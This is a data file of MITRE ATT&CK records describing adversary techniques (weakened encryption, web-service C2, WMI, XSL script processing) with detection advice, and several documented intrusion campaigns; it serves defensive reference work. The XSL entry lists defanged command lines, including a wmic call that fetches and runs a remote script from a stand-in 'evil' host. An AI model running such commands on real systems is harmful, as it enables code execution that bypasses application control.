{"ID":"T1600.002","name":"Weaken Encryption: Disable Crypto Hardware","description":"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)","url":"https://attack.mitre.org/techniques/T1600/002","created":"19 October 2020","last modified":"21 October 2020","version":"1.0","tactics":"Defense Evasion","detection":"There is no documented method for defenders to directly identify behaviors that disable cryptographic hardware. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation.","platforms":"Network","data sources":"File: File Modification","is sub-technique":true,"sub-technique of":"T1600","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1600.001","name":"Weaken Encryption: Reduce Key Space","description":"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)","url":"https://attack.mitre.org/techniques/T1600/001","created":"19 October 2020","last modified":"21 October 2020","version":"1.0","tactics":"Defense Evasion","detection":"There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation.","platforms":"Network","data sources":"File: File Modification","is sub-technique":true,"sub-technique of":"T1600","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1102","name":"Web Service","description":"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","url":"https://attack.mitre.org/techniques/T1102","created":"31 May 2017","last modified":"26 March 2020","version":"1.1","tactics":"Command and Control","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Anastasios Pingios","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cisco Talos Intelligence Group),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Volexity Ocean Lotus November 2020),(Citation: Intezer Doki July 20),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Talos Rocke August 2018),(Citation: FireEye NETWIRE March 2019),(Citation: Cybereason Bazar July 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Google EXOTIC LILY March 2022),(Citation: ESET Operation Spalax Jan 2021),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: Aqua TeamTNT August 2020),(Citation: Mandiant APT41),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Microsoft WhisperGate January 2022),(Citation: FireEye FIN6 Apr 2019),(Citation: Zdnet Ngrok September 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Unit 42 Hildegard Malware),(Citation: Anomali Rocke March 2019),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Accenture HyperStack October 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: ESET Crutch December 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Symantec Inception Framework March 2018),(Citation: Bitdefender FIN8 July 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Zscaler Bazar September 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cybereason Molerats Dec 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),"}
{"ID":"T1102.002","name":"Web Service: Bidirectional Communication","description":"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ","url":"https://attack.mitre.org/techniques/T1102/002","created":"14 March 2020","last modified":"26 March 2020","version":"1.0","tactics":"Command and Control","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1102","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Meyers Numbered Panda),(Citation: Mandiant APT1 Appendix),(Citation: IBM Grandoreiro April 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: ESET Telebots June 2017),(Citation: Talos ROKRAT),(Citation: Forcepoint Carbanak Google C2),(Citation: Mandiant APT1),(Citation: Palo Alto Comnie),(Citation: Talent-Jump Clambling February 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: PaloAlto Patchwork Mar 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ESET Telebots Dec 2016),(Citation: Microsoft POLONIUM June 2022),(Citation: F-Secure CozyDuke),(Citation: Forcepoint Monsoon),(Citation: ESET Grandoreiro April 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: FireEye APT17),(Citation: ESET Turla Mosquito Jan 2018),(Citation: FireEye admin@338),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Github PowerShell Empire),(Citation: Talos Group123),(Citation: Checkpoint IndigoZebra July 2021),(Citation: ESET ComRAT May 2020),(Citation: Lazarus APT January 2022),(Citation: ESET Turla Mosquito May 2018),(Citation: F-Secure The Dukes),(Citation: FireEye APT37 Feb 2018),(Citation: BitDefender Chafer May 2020),(Citation: CyberESI GTALK),(Citation: ASERT Donot March 2018),(Citation: Google Election Threats October 2020),(Citation: Anomali Static Kitten February 2021),(Citation: CISA ComRAT Oct 2020),(Citation: ESET Crutch December 2020),(Citation: Securelist ScarCruft May 2019),(Citation: FireEye Periscope March 2018),(Citation: Cofense RevengeRAT Feb 2019),(Citation: ESET Dukes October 2019),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Unit 42 Nokki Oct 2018),(Citation: TrendMicro Pawn Storm Dec 2020),"}
{"ID":"T1102.001","name":"Web Service: Dead Drop Resolver","description":"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","url":"https://attack.mitre.org/techniques/T1102/001","created":"14 March 2020","last modified":"26 March 2020","version":"1.0","tactics":"Command and Control","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1102","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Palo Alto PlugX June 2017),(Citation: PaloAlto Patchwork Mar 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Unit42 Redaman January 2019),(Citation: Forcepoint Monsoon),(Citation: CheckPoint Redaman October 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye APT17),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Mandiant APT41),(Citation: ESET RTM Feb 2017),(Citation: F-Secure The Dukes),(Citation: Anomali Rocke March 2019),(Citation: Securelist Dropping Elephant),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: FireEye Periscope March 2018),(Citation: ESET Dukes October 2019),(Citation: ESET Casbaneiro Oct 2019),(Citation: Unit42 Xbash Sept 2018),(Citation: Securelist MiniDuke Feb 2013),"}
{"ID":"T1102.003","name":"Web Service: One-Way Communication","description":"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.","url":"https://attack.mitre.org/techniques/T1102/003","created":"14 March 2020","last modified":"26 March 2020","version":"1.0","tactics":"Command and Control","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1102","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye Metamorfo Apr 2018),(Citation: Fortinet Metamorfo Feb 2020),(Citation: FireEye Periscope March 2018),(Citation: FireEye APT29),(Citation: Prevailion EvilNum May 2020),(Citation: Medium Metamorfo Apr 2020),(Citation: F-Secure The Dukes),"}
{"ID":"T1047","name":"Windows Management Instrumentation","description":"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)","url":"https://attack.mitre.org/techniques/T1047","created":"31 May 2017","last modified":"07 April 2023","version":"1.3","tactics":"Execution","detection":"Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)","platforms":"Windows","data sources":"Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"@ionstorm","permissions required":null,"supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Microsoft Prestige ransomware October 2022),(Citation: FireEye Obfuscation June 2017),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: FoxIT Wocao December 2019),(Citation: Novetta Blockbuster RATs),(Citation: Securelist MuddyWater Oct 2018),(Citation: Costa AvosLocker May 2022),(Citation: Impacket Tools),(Citation: SecureWorks WannaCry Analysis),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: CME Github September 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Lucifer June 2020),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Github Koadic),(Citation: Juniper IcedID June 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Securelist BlackEnergy Feb 2015),(Citation: Bitdefender FIN8 July 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: Symantec WastedLocker June 2020),(Citation: Bitdefender Agent Tesla April 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: Cybereason Bumblebee August 2022),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: RATANKBA),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: BleepingComputer Molerats Dec 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Alperovitch 2014),(Citation: Mandiant No Easy Breach),(Citation: eSentire FIN7 July 2021),(Citation: CERT-EE Gamaredon January 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: FireEye FIN7 April 2017),(Citation: Unit42 Sofacy Dec 2018),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Google EXOTIC LILY March 2022),(Citation: SentinelOne Valak June 2020),(Citation: jRAT Symantec Aug 2018),(Citation: Bitdefender Naikon April 2021),(Citation: GitHub PowerSploit May 2012),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Hornet Security Avaddon June 2020),(Citation: Unit 42 OilRig Sept 2018),(Citation: Securelist Remexi Jan 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Sophos Maze VM September 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Github AD-Pentest-Script),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Cybereason Soft Cell June 2019),(Citation: Qualys LolZarus),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Netwalker May 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Group IB Ransomware May 2020),(Citation: ESET Lazarus Jun 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Radware Micropsia July 2018),(Citation: ESET GreyEnergy Oct 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Lazarus RATANKBA),(Citation: Carbon Black Emotet Apr 2019),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Securelist Octopus Oct 2018),(Citation: Prevailion EvilNum May 2020),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye WannaCry 2017),(Citation: Novetta Blockbuster),(Citation: US-CERT NotPetya 2017),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: Kaspersky StoneDrill 2017),(Citation: DFIR Ryuk's Return October 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: LogRhythm WannaCry),(Citation: Talos Olympic Destroyer 2018),(Citation: NCC Group Black Basta June 2022),(Citation: CrowdStrike Grim Spider May 2019),(Citation: ESET Hermetic Wizard March 2022),(Citation: Cisco Talos Avos Jun 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: NCC Group Chimera January 2021),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Talos GravityRAT),(Citation: Talos Micropsia June 2017),(Citation: Talos Nyetya June 2017),(Citation: Symantec Cicada November 2020),(Citation: Kaspersky QakBot September 2021),(Citation: McAfee Maze March 2020),(Citation: BlackBerry Bahamut),(Citation: FireEye APT32 May 2017),(Citation: Cybereason Bazar July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Bromium Ursnif Mar 2017),(Citation: HP SVCReady Jun 2022),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Microsoft BlackCat Jun 2022),(Citation: PowerSploit Documentation),(Citation: Talos MuddyWater May 2019),(Citation: Talos Frankenstein June 2019),(Citation: Dragos EKANS),(Citation: Group IB Ransomware September 2020),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: DustySky),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: cobaltstrike manual),(Citation: Proofpoint TA505 Mar 2018),(Citation: Check Point Meteor Aug 2021),(Citation: FireEye FiveHands April 2021),(Citation: Cycraft Chimera April 2020),(Citation: Microsoft 365 Defender Solorigate),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Microsoft WDAC),(Citation: win10_asr),(Citation: FireEye WMI 2015)"}
{"ID":"T1220","name":"XSL Script Processing","description":"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>","url":"https://attack.mitre.org/techniques/T1220","created":"17 October 2018","last modified":"05 May 2022","version":"1.2","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.","platforms":"Windows","data sources":"Module: Module Load, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Application Control, Digital Certificate Validation","contributors":"Avneet Singh; Casey Smith; Praetorian","permissions required":null,"supports remote":null,"system requirements":"Microsoft Core XML Services (MSXML) or access to wmic.exe","impact type":null,"effective permissions":null,"relationship citations":"(Citation: PTSecurity Higaisa 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Talos Cobalt Group July 2018),(Citation: Cybereason Astaroth Feb 2019),"}
{"ID":"C0025","name":"2016 Ukraine Electric Power Attack","description":"[2016 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0025) was a [Sandworm Team](https://attack.mitre.org/groups/G0034) campaign during which they used [Industroyer](https://attack.mitre.org/software/S0604) malware to target and disrupt distribution substations within the Ukrainian power grid. This campaign was the second major public attack conducted against Ukraine by [Sandworm Team](https://attack.mitre.org/groups/G0034).(Citation: ESET Industroyer)(Citation: Dragos Crashoverride 2018)","url":"https://attack.mitre.org/campaigns/C0025","created":"31 March 2023","last modified":"10 April 2023","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: ESET Industroyer),(Citation: Dragos Crashoverride 2018),(Citation: ESET Industroyer),(Citation: Dragos Crashoverride 2018),(Citation: Dragos Crashoverride 2017),(Citation: Joe Slowik August 2019),(Citation: US District Court Indictment GRU Unit 74455 October 2020)"}
{"ID":"C0010","name":"C0010","description":"[C0010](https://attack.mitre.org/campaigns/C0010) was a cyber espionage campaign conducted by UNC3890 that targeted Israeli shipping, government, aviation, energy, and healthcare organizations. Security researcher assess UNC3890 conducts operations in support of Iranian interests, and noted several limited technical connections to Iran, including PDB strings and Farsi language artifacts. [C0010](https://attack.mitre.org/campaigns/C0010) began by at least late 2020, and was still ongoing as of mid-2022.(Citation: Mandiant UNC3890 Aug 2022)","url":"https://attack.mitre.org/campaigns/C0010","created":"21 September 2022","last modified":"04 October 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: Mandiant UNC3890 Aug 2022),(Citation: Mandiant UNC3890 Aug 2022),"}
{"ID":"C0011","name":"C0011","description":"[C0011](https://attack.mitre.org/campaigns/C0011) was a suspected cyber espionage campaign conducted by [Transparent Tribe](https://attack.mitre.org/groups/G0134) that targeted students at universities and colleges in India. Security researchers noted this campaign against students was a significant shift from [Transparent Tribe](https://attack.mitre.org/groups/G0134)'s historic targeting Indian government, military, and think tank personnel, and assessed it was still ongoing as of July 2022.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) ","url":"https://attack.mitre.org/campaigns/C0011","created":"22 September 2022","last modified":"22 September 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)"}
{"ID":"C0015","name":"C0015","description":"[C0015](https://attack.mitre.org/campaigns/C0015) was a ransomware intrusion during which the unidentified attackers used [Bazar](https://attack.mitre.org/software/S0534), [Cobalt Strike](https://attack.mitre.org/software/S0154), and [Conti](https://attack.mitre.org/software/S0575), along with other tools, over a 5 day period. Security researchers assessed the actors likely used the widely-circulated [Conti](https://attack.mitre.org/software/S0575) ransomware playbook based on the observed pattern of activity and operator errors.(Citation: DFIR Conti Bazar Nov 2021)","url":"https://attack.mitre.org/campaigns/C0015","created":"29 September 2022","last modified":"29 September 2022","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":"Matt Brenton, Zurich Insurance Group","relationship citations":"(Citation: DFIR Conti Bazar Nov 2021),(Citation: DFIR Conti Bazar Nov 2021),"}
{"ID":"C0017","name":"C0017","description":"[C0017](https://attack.mitre.org/campaigns/C0017) was an [APT41](https://attack.mitre.org/groups/G0096) campaign conducted between May 2021 and February 2022 that successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications. During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) was quick to adapt and use publicly-disclosed as well as zero-day vulnerabilities for initial access, and in at least two cases re-compromised victims following remediation efforts. The goals of [C0017](https://attack.mitre.org/campaigns/C0017) are unknown, however [APT41](https://attack.mitre.org/groups/G0096) was observed exfiltrating Personal Identifiable Information (PII).(Citation: Mandiant APT41)","url":"https://attack.mitre.org/campaigns/C0017","created":"01 December 2022","last modified":"25 January 2023","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":"Kyaw Pyiyt Htet, @KyawPyiytHtet","relationship citations":"(Citation: Mandiant APT41),(Citation: Mandiant APT41),(Citation: Mandiant APT41)"}
{"ID":"C0018","name":"C0018","description":"\n[C0018](https://attack.mitre.org/campaigns/C0018) was a month-long ransomware intrusion that successfully deployed [AvosLocker](https://attack.mitre.org/software/S1053) onto a compromised network. The unidentified actors gained initial access to the victim network through an exposed server and used a variety of open-source tools prior to executing [AvosLocker](https://attack.mitre.org/software/S1053).(Citation: Costa AvosLocker May 2022)(Citation: Cisco Talos Avos Jun 2022)","url":"https://attack.mitre.org/campaigns/C0018","created":"17 January 2023","last modified":"14 February 2023","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":"Flavio Costa, Cisco","relationship citations":"(Citation: Cisco Talos Avos Jun 2022),(Citation: Costa AvosLocker May 2022),(Citation: Cisco Talos Avos Jun 2022),(Citation: Costa AvosLocker May 2022),"}
{"ID":"C0021","name":"C0021","description":"[C0021](https://attack.mitre.org/campaigns/C0021) was a spearphishing campaign conducted in November 2018 that targeted public sector institutions, non-governmental organizations (NGOs), educational institutions, and private-sector corporations in the oil and gas, chemical, and hospitality industries. The majority of targets were located in the US, particularly in and around Washington D.C., with other targets located in Europe, Hong Kong, India, and Canada. [C0021](https://attack.mitre.org/campaigns/C0021)'s technical artifacts, tactics, techniques, and procedures (TTPs), and targeting overlap with previous suspected [APT29](https://attack.mitre.org/groups/G0016) activity.(Citation: Microsoft Unidentified Dec 2018)(Citation: FireEye APT29 Nov 2018)","url":"https://attack.mitre.org/campaigns/C0021","created":"15 March 2023","last modified":"05 April 2023","version":"1.0","associated campaigns":null,"associated campaigns citations":null,"contributors":null,"relationship citations":"(Citation: Microsoft Unidentified Dec 2018),(Citation: FireEye APT29 Nov 2018),(Citation: Microsoft Unidentified Dec 2018),(Citation: FireEye APT29 Nov 2018),"}
